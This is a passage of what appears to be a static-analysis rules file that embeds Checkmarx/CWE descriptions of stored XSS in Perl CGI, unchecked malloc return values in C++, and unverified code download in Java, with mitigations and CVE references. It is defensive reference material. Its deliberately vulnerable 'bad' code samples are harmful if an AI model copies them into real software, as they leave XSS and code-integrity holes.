
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Causal Nature"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt;&lt;a href="javascript:toggleblocksOC('107_Causal Nature');"&gt;f&lt;/a&gt; &lt;/span&gt;Causal Nature&lt;/div&gt;&lt;div name="oc_107_Causal Nature" id="oc_107_Causal Nature" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="indent"&gt;Explicit&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_107_Taxonomy Mappings" id="oc_107_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Struts: Unused Validation Form&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_107_Content History" id="oc_107_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Potential Mitigations,
Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Description, Relationships, Taxonomy Mappings,
Weakness Ordinalities&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_626</key><name>CGI_Stored_XSS</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;&lt;span style="color: rgba(0, 0, 0, 0.870588); font-family: Arial; line-height: 25.7143px; white-space: pre-wrap;"&gt;Stored malicious data might retrieve system information and exploit the system through CGI (Common Gateway Interface).&lt;/span&gt;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p dir="ltr" style="box-sizing: border-box; margin: 0pt 0px; color: rgba(0, 0, 0, 0.870588); font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; line-height: 1.71429;"&gt;&lt;span style="box-sizing: border-box; font-family: Arial; color: #000000; vertical-align: baseline; white-space: pre-wrap;"&gt;The CGI specification provides opportunities to read files, acquire shell access, and corrupt file systems on server machines and their attached hosts. &amp;nbsp;&lt;/span&gt;&lt;/p&gt;
&lt;p dir="ltr" style="box-sizing: border-box; margin: 0pt 0px; color: rgba(0, 0, 0, 0.870588); font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; line-height: 1.71429;"&gt;&lt;span style="box-sizing: border-box; font-family: Arial; color: #000000; vertical-align: baseline; white-space: pre-wrap;"&gt;Means of gaining access include: exploiting assumptions of the script, exploiting weaknesses in the server environment, and exploiting weaknesses in other programs and system calls. &amp;nbsp;&lt;/span&gt;&lt;/p&gt;
&lt;p dir="ltr" style="box-sizing: border-box; margin: 0pt 0px; color: rgba(0, 0, 0, 0.870588); font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; line-height: 1.71429;"&gt;&amp;nbsp;&lt;/p&gt;
&lt;p dir="ltr" style="box-sizing: border-box; margin: 0pt 0px; color: rgba(0, 0, 0, 0.870588); font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; line-height: 1.71429;"&gt;&lt;span style="box-sizing: border-box; font-family: Arial; color: #000000; vertical-align: baseline; white-space: pre-wrap;"&gt;The primary weakness in CGI scripts is insufficient input validation.&lt;/span&gt;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p dir="ltr" style="box-sizing: border-box; margin: 0pt 0px; color: rgba(0, 0, 0, 0.870588); font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; line-height: 1.38;"&gt;&lt;span style="box-sizing: border-box; font-family: Arial; color: #000000; vertical-align: baseline; white-space: pre-wrap;"&gt;Do not provide unnecessary file permissions.&lt;/span&gt;&lt;/p&gt;
&lt;p dir="ltr" style="box-sizing: border-box; margin: 0pt 0px; color: rgba(0, 0, 0, 0.870588); font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; line-height: 1.38;"&gt;&lt;span id="docs-internal-guid-c71b5d0e-9d95-efa3-1ca7-894d4af475fb" style="box-sizing: border-box;"&gt;&lt;span style="box-sizing: border-box; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"&gt;Validate and encode all DB output.&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Perl&lt;/h3&gt;&lt;h4&gt;Bad - Printing out data from BD without encoding&lt;/h4&gt;&lt;pre&gt;#!/usr/bin/perl
use CGI;
use DBI;

my $cgi = CGI-&gt;new();

$dbh = DBI-&gt;connect('dbi:mysql:perltest','root','password')
  or die "Connection Error: $DBI::errstr\n";
$sql = "select * from samples";
$sth = $dbh-&gt;prepare($sql);
$sth-&gt;execute
  or die "SQL Error: $DBI::errstr\n";

my @row = $sth-&gt;fetchrow_array;

print $cgi-&gt;header();
	$cgi-&gt;start_html(),
	$cgi-&gt;p("The result from DB is: ", @row),
	$cgi-&gt;end_html;&lt;/pre&gt;&lt;h4&gt;Good - Printing out from DB after encoding&lt;/h4&gt;&lt;pre&gt;#!/usr/bin/perl
use CGI;
use DBI;
use HTML::Entities;

my $cgi = CGI-&gt;new();

$dbh = DBI-&gt;connect('dbi:mysql:perltest','root','password')
  or die "Connection Error: $DBI::errstr\n";
$sql = "select * from samples";
$sth = $dbh-&gt;prepare($sql);
$sth-&gt;execute
  or die "SQL Error: $DBI::errstr\n";

my @row = $sth-&gt;fetchrow_array;

print $cgi-&gt;header();
	$cgi-&gt;start_html(),
	$cgi-&gt;p("The result from DB is: ", HTML::Entities::encode(@row)),
	$cgi-&gt;end_html;&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1697</key><name>Unchecked_Return_Value_to_NULL_Pointer_Dereference</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;A program that does not check function return values could cause the application to enter an undefined state. This could lead to unexpected behavior and unintended consequences, including inconsistent data, system crashes or other error-based exploits.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;The application calls a system function, but does not receive or check the result of this funciton. These functions often return error codes in the result, or share other status codes with it's caller. The application simply ignores this result value, losing this vital information.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p&gt;&amp;nbsp;- Always check the result of any called function that returns a value, and verify the result is an expected value.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;- Ensure the calling function responds to all possible return values.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;- Expect runtime errors and handle them gracefully. Explicitly define a mechanism for handling unexpected errors.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CPP&lt;/h3&gt;&lt;h4&gt;Unchecked Memory Allocation&lt;/h4&gt;&lt;pre&gt;buff = (char*) malloc(size);
strncpy(buff, source, size);&lt;/pre&gt;&lt;h4&gt;Safer Memory Allocation&lt;/h4&gt;&lt;pre&gt;buff = (char*) malloc(size+1);
if (buff==NULL) exit(1);

strncpy(buff, source, size);
buff[size] = '\0';&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_3896</key><name>Download_of_Code_Without_Integrity_Check</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Download of Code Without Integrity Check&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;494&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Base)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Draft"&gt;Draft&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_494_Description" id="oc_494_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The product downloads source code or an executable from a
remote location and executes the code without sufficiently verifying the origin
and integrity of the code.&lt;/div&gt;
&lt;p class="subheading"&gt;Extended Description&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;An attacker can execute malicious code by compromising the host server,
performing DNS spoofing, or modifying the code in transit.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_494_Time of Introduction" id="oc_494_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Architecture and Design&lt;/li&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_494_Applicable Platforms" id="oc_494_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;Language-independent&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Common Consequences"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Common Consequences&lt;/div&gt;&lt;div name="oc_494_Common Consequences" id="oc_494_Common Consequences" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Scope&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Effect&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Availability&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;Executing untrusted code could result in a compromise of the
application and failure to function correctly for users.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Confidentiality&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;If an attacker can influence the untrusted code then, upon execution,
it may provide the attacker with access to sensitive files.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Integrity&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;Executing untrusted code could compromise the control flow of the
program, possibly also leading to the modification of sensitive
resources.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Likelihood of Exploit"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Likelihood of Exploit&lt;/div&gt;&lt;div name="oc_494_Likelihood of Exploit" id="oc_494_Likelihood of Exploit" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="indent"&gt;Medium&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Detection Methods"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Detection Methods&lt;/div&gt;&lt;div name="oc_494_Detection Methods" id="oc_494_Detection Methods" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt; Manual Analysis&lt;/p&gt;&lt;p&gt;Manual analysis is typically required to find the behavior that
triggers the download of code, and to determine whether
integrity-checking methods are in use.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Demonstrative Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Demonstrative Examples&lt;/div&gt;&lt;div name="oc_494_Demonstrative Examples" id="oc_494_Demonstrative Examples" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="subheading"&gt;Example 1&lt;/p&gt;&lt;p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;Java&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;URL[] classURLs= new URL[]{&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;new URL("file:subdir/")&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;};&lt;/div&gt;&lt;div style="font-size:90%;"&gt;URLClassLoader loader = new URLClassLoader(classURLs);&lt;/div&gt;&lt;div style="font-size:90%;"&gt;Class loadedClass = Class.forName("loadMe", true, loader);&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Observed Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Observed Examples&lt;/div&gt;&lt;div name="oc_494_Observed Examples" id="oc_494_Observed Examples" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Reference&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Description&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3438" target="_blank"&gt;CVE-2008-3438&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;OS does not verify authenticity of its own
updates.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3324" target="_blank"&gt;CVE-2008-3324&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;online poker client does not verify authenticity
of its own updates.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1125" target="_blank"&gt;CVE-2001-1125&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;anti-virus product does not verify automatic
updates for itself.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0671" target="_blank"&gt;CVE-2002-0671&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;VOIP phone downloads applications from web sites
without verifying integrity.&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_494_Potential Mitigations" id="oc_494_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Implementation&lt;/p&gt;&lt;p&gt;Perform proper forward and reverse DNS lookups to detect DNS spoofing.
This is only a partial solution since it will not prevent your code from
being modified on the hosting site or in transit.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phases:  Architecture and Design; Operation&lt;/p&gt;&lt;p&gt;Encrypt the code with a reliable encryption scheme before
transmitting.&lt;/p&gt;&lt;p&gt;This will only be a partial solution, since it will not detect DNS
spoofing and it will not prevent your code from being modified on the
hosting site.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Architecture and Design&lt;/p&gt;&lt;p&gt;Use integrity checking on the transmitted code.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;If you are providing the code that is to be downloaded, such as
for automatic updates of your software, then use cryptographic
signatures for your code and modify your download clients to verify
the signatures. Ensure that your implementation does not contain
CWE-295, CWE-320, CWE-347, and related weaknesses.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Use code signing technologies such as Authenticode. See
references.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Testing&lt;/p&gt;&lt;p&gt;Use tools and techniques that require manual (human) analysis, such as
penetration testing, threat modeling, and interactive tools that allow
the tester to record and modify an active session. These may be more
effective than strictly automated techniques. This is especially the
case with weaknesses that are related to design and business
rules.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Testing&lt;/p&gt;&lt;p&gt;Use monitoring tools that examine the software's process as it
interacts with the operating system and the network. This technique is
useful in cases when source code is unavailable, if the software was not
developed by you, or if you want to verify that the build phase did not
introduce any new weaknesses. Examples include debuggers that directly
attach to the running process; system-call tracing utilities such as
truss (Solaris) and strace (Linux); system activity monitors such as
FileMon, RegMon, Process Monitor, and other Sysinternals utilities
(Windows); and sniffers and protocol analyzers that monitor network
traffic.&lt;/p&gt;&lt;p&gt;Attach the monitor to the process and also sniff the network
connection. Trigger features related to product updates or plugin
installation, which is likely to force a code download. Monitor when
files are downloaded and separately executed, or if they are otherwise
read back into the process. Look for evidence of cryptographic library
calls that use integrity checking.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_494_Relationships" id="oc_494_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;490&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=490" target="_blank"&gt;Mobile Code Issues&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;669&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=669" target="_blank"&gt;Incorrect Resource Transfer Between Spheres&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;752&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=752" target="_blank"&gt;2009 Top 25 - Risky Resource Management&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in the 2009 CWE/SANS Top 25 Most Dangerous Programming Errors &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;750&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;802&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=802" target="_blank"&gt;2010 Top 25 - Risky Resource Management&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in the 2010 CWE/SANS Top 25 Most Dangerous Programming Errors &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;800&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;PeerOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;79&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=79" target="_blank"&gt;Failure to Preserve Web Page Structure ('Cross-site Scripting')&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
